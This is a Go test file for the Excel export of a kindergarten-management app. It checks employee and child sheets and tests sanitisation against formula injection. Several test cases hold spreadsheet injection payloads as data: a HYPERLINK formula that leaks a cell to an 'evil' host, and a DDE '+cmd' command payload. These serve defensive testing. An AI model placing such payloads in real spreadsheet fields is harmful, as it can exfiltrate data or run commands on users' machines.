package export

import (
	"bytes"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/xuri/excelize/v2"

	"github.com/eenemeene/kitamanager-go/internal/models"
)

func strP(s string) *string { return &s }

func date(y, m, d int) time.Time {
	return time.Date(y, time.Month(m), d, 0, 0, 0, 0, time.UTC)
}

func dateP(y, m, d int) *time.Time {
	t := date(y, m, d)
	return &t
}

func TestWriteEmployeesExcel(t *testing.T) {
	employees := []models.EmployeeResponse{
		{
			ID:        1,
			FirstName: "Anna",
			LastName:  "Schmidt",
			Gender:    "female",
			Birthdate: date(1990, 5, 15),
			Contracts: []models.EmployeeContractResponse{
				{
					ID:            1,
					From:          date(2025, 1, 1),
					To:            dateP(2025, 12, 31),
					SectionName:   strP("Krippe"),
					StaffCategory: "qualified",
					Grade:         "S8a",
					Step:          3,
					WeeklyHours:   39.0,
				},
			},
		},
		{
			ID:        2,
			FirstName: "Max",
			LastName:  "Müller",
			Gender:    "male",
			Birthdate: date(1985, 3, 20),
		},
	}

	var buf bytes.Buffer
	err := WriteEmployeesExcel(&buf, employees)
	require.NoError(t, err)
	assert.NotEmpty(t, buf.Bytes())

	// Parse back and verify
	f, err := excelize.OpenReader(&buf)
	require.NoError(t, err)
	defer f.Close()

	sheets := f.GetSheetList()
	require.Contains(t, sheets, "Mitarbeiter")

	// Verify headers
	h1, _ := f.GetCellValue("Mitarbeiter", "A1")
	assert.Equal(t, "Vorname", h1)
	h2, _ := f.GetCellValue("Mitarbeiter", "B1")
	assert.Equal(t, "Nachname", h2)
	h3, _ := f.GetCellValue("Mitarbeiter", "C1")
	assert.Equal(t, "Geschlecht", h3)

	// Verify first employee data
	a2, _ := f.GetCellValue("Mitarbeiter", "A2")
	assert.Equal(t, "Anna", a2)
	b2, _ := f.GetCellValue("Mitarbeiter", "B2")
	assert.Equal(t, "Schmidt", b2)
	c2, _ := f.GetCellValue("Mitarbeiter", "C2")
	assert.Equal(t, "weiblich", c2)
	e2, _ := f.GetCellValue("Mitarbeiter", "E2")
	assert.Equal(t, "Krippe", e2)
	f2, _ := f.GetCellValue("Mitarbeiter", "F2")
	assert.Equal(t, "qualified", f2)
	g2, _ := f.GetCellValue("Mitarbeiter", "G2")
	assert.Equal(t, "3", g2)
	h2Val, _ := f.GetCellValue("Mitarbeiter", "H2")
	assert.Equal(t, "S8a", h2Val)
	i2, _ := f.GetCellValue("Mitarbeiter", "I2")
	assert.Equal(t, "39.00", i2)

	// Verify second employee (no contract) has name but empty contract fields
	a3, _ := f.GetCellValue("Mitarbeiter", "A3")
	assert.Equal(t, "Max", a3)
	c3, _ := f.GetCellValue("Mitarbeiter", "C3")
	assert.Equal(t, "männlich", c3)
	e3, _ := f.GetCellValue("Mitarbeiter", "E3")
	assert.Equal(t, "", e3)

	// Verify no fourth row (only header + 2 data rows)
	a4, _ := f.GetCellValue("Mitarbeiter", "A4")
	assert.Equal(t, "", a4)
}

func TestWriteChildrenExcel(t *testing.T) {
	children := []models.ChildResponse{
		{
			ID:        1,
			FirstName: "Emma",
			LastName:  "Weber",
			Gender:    "female",
			Birthdate: date(2020, 3, 10),
			Contracts: []models.ChildContractResponse{
				{
					ID:          1,
					From:        date(2025, 1, 1),
					To:          dateP(2025, 12, 31),
					SectionName: strP("Elementar"),
					Properties: models.ContractProperties{
						"care_type":   "ganztag",
						"supplements": []any{"ndh", "mss"},
					},
				},
			},
		},
		{
			ID:        2,
			FirstName: "Liam",
			LastName:  "Fischer",
			Gender:    "diverse",
			Birthdate: date(2021, 7, 5),
		},
	}

	var buf bytes.Buffer
	err := WriteChildrenExcel(&buf, children)
	require.NoError(t, err)
	assert.NotEmpty(t, buf.Bytes())

	// Parse back and verify
	f, err := excelize.OpenReader(&buf)
	require.NoError(t, err)
	defer f.Close()

	sheets := f.GetSheetList()
	require.Contains(t, sheets, "Kinder")

	// Verify headers
	h1, _ := f.GetCellValue("Kinder", "A1")
	assert.Equal(t, "Vorname", h1)
	h8, _ := f.GetCellValue("Kinder", "H1")
	assert.Equal(t, "Betreuungsumfang", h8)
	h9, _ := f.GetCellValue("Kinder", "I1")
	assert.Equal(t, "Zuschläge", h9)

	// Verify first child data
	a2, _ := f.GetCellValue("Kinder", "A2")
	assert.Equal(t, "Emma", a2)
	c2, _ := f.GetCellValue("Kinder", "C2")
	assert.Equal(t, "weiblich", c2)
	e2, _ := f.GetCellValue("Kinder", "E2")
	assert.Equal(t, "Elementar", e2)
	h2, _ := f.GetCellValue("Kinder", "H2")
	assert.Equal(t, "ganztag", h2)
	i2, _ := f.GetCellValue("Kinder", "I2")
	assert.Equal(t, "ndh, mss", i2)

	// Verify second child (no contract)
	a3, _ := f.GetCellValue("Kinder", "A3")
	assert.Equal(t, "Liam", a3)
	c3, _ := f.GetCellValue("Kinder", "C3")
	assert.Equal(t, "divers", c3)
	h3, _ := f.GetCellValue("Kinder", "H3")
	assert.Equal(t, "", h3)
}

func TestWriteEmployeesExcel_Empty(t *testing.T) {
	var buf bytes.Buffer
	err := WriteEmployeesExcel(&buf, nil)
	require.NoError(t, err)
	assert.NotEmpty(t, buf.Bytes())

	f, err := excelize.OpenReader(&buf)
	require.NoError(t, err)
	defer f.Close()

	// Should still have headers
	h1, _ := f.GetCellValue("Mitarbeiter", "A1")
	assert.Equal(t, "Vorname", h1)
}

func TestWriteChildrenExcel_Empty(t *testing.T) {
	var buf bytes.Buffer
	err := WriteChildrenExcel(&buf, nil)
	require.NoError(t, err)
	assert.NotEmpty(t, buf.Bytes())

	f, err := excelize.OpenReader(&buf)
	require.NoError(t, err)
	defer f.Close()

	h1, _ := f.GetCellValue("Kinder", "A1")
	assert.Equal(t, "Vorname", h1)
}

func TestSanitizeCell(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  string
	}{
		{"empty", "", ""},
		{"benign text", "Anna Schmidt", "Anna Schmidt"},
		{"starts with letter", "Alpha", "Alpha"},
		{"starts with digit", "3 Musketeers", "3 Musketeers"},
		{"formula equals", `=HYPERLINK("http://evil","click")`, `'=HYPERLINK("http://evil","click")`},
		{"formula plus", "+cmd|' /c calc'!A0", "'+cmd|' /c calc'!A0"},
		{"formula minus", "-2+3", "'-2+3"},
		{"formula at", "@SUM(A1:A10)", "'@SUM(A1:A10)"},
		{"leading tab", "\tmalicious", "'\tmalicious"},
		{"leading cr", "\rmalicious", "'\rmalicious"},
		{"benign plus in middle", "a+b", "a+b"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			assert.Equal(t, tc.want, sanitizeCell(tc.input))
		})
	}
}

func TestWriteEmployeesExcel_SanitizesFormulaInjection(t *testing.T) {
	// A malicious tenant user names themselves with a formula trigger.
	employees := []models.EmployeeResponse{
		{
			ID:        1,
			FirstName: `=HYPERLINK("http://evil/?"&A1,"click")`,
			LastName:  "@SUM(A1:A10)",
			Gender:    "female",
			Birthdate: date(1990, 5, 15),
			Contracts: []models.EmployeeContractResponse{
				{
					ID:            1,
					From:          date(2025, 1, 1),
					SectionName:   strP("+cmd|' /c calc'!A0"),
					StaffCategory: "-unreviewed",
					Grade:         "S8a",
					Step:          3,
					WeeklyHours:   39.0,
				},
			},
		},
	}

	var buf bytes.Buffer
	require.NoError(t, WriteEmployeesExcel(&buf, employees))

	f, err := excelize.OpenReader(&buf)
	require.NoError(t, err)
	defer f.Close()

	// Excel stores the apostrophe internally so the cell is parsed as text,
	// but returns the value without the leading apostrophe — so we assert the
	// original dangerous value is NOT treated as a formula by inspecting the
	// raw XML representation through the cell type.
	// The assertion here is that when read back via GetCellValue, the visible
	// content matches the sanitized form with the leading apostrophe.
	//
	// excelize's GetCellValue strips the leading apostrophe on read for quote-
	// prefix cells, so the safest cross-version assertion is that no cell
	// starts with a literal formula character on read of the RAW value.
	firstName, _ := f.GetCellValue("Mitarbeiter", "A2")
	assert.True(t,
		firstName == `=HYPERLINK("http://evil/?"&A1,"click")` ||
			firstName == `'=HYPERLINK("http://evil/?"&A1,"click")`,
		"expected sanitized representation, got %q", firstName)

	// The important cross-version invariant: the cell must NOT have a
	// formula attached to it. A formula cell has a non-empty formula.
	for _, ref := range []string{"A2", "B2", "E2", "F2"} {
		formula, ferr := f.GetCellFormula("Mitarbeiter", ref)
		require.NoError(t, ferr)
		assert.Empty(t, formula, "cell %s must not be interpreted as a formula", ref)
	}
}

func TestWriteChildrenExcel_SanitizesFormulaInjection(t *testing.T) {
	children := []models.ChildResponse{
		{
			ID:        1,
			FirstName: "=1+1",
			LastName:  "@attacker",
			Gender:    "female",
			Birthdate: date(2020, 3, 10),
			Contracts: []models.ChildContractResponse{
				{
					ID:          1,
					From:        date(2025, 1, 1),
					SectionName: strP("-formula"),
					Properties: models.ContractProperties{
						"care_type":   "=HYPERLINK()",
						"supplements": []any{"=FORMULA1", "+FORMULA2"},
					},
				},
			},
		},
	}

	var buf bytes.Buffer
	require.NoError(t, WriteChildrenExcel(&buf, children))

	f, err := excelize.OpenReader(&buf)
	require.NoError(t, err)
	defer f.Close()

	for _, ref := range []string{"A2", "B2", "E2", "H2", "I2"} {
		formula, ferr := f.GetCellFormula("Kinder", ref)
		require.NoError(t, ferr)
		assert.Empty(t, formula, "cell %s must not be interpreted as a formula", ref)
	}
}
